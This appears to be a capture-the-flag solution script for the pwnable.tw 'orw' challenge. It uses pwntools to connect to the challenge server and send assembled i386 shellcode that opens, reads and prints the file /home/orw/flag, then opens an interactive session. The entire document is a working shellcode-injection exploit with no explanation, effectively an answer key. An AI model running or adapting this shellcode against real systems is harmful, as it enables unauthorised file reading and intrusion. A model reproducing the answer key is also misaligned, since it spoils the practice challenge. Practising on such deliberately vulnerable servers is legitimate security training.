import pwn

with pwn.context.local(log_level='critical'):
    r = pwn.remote('chall.pwnable.tw', 10001)

    shellcode = ''.join([
        pwn.shellcraft.i386.open('/home/orw/flag'),
        pwn.shellcraft.i386.read(3, 'esp', 0x27),
        pwn.shellcraft.i386.write(1, 'esp', 0x27)
    ])

    r.sendlineafter(':', pwn.asm(shellcode, arch='i386'))
    r.interactive()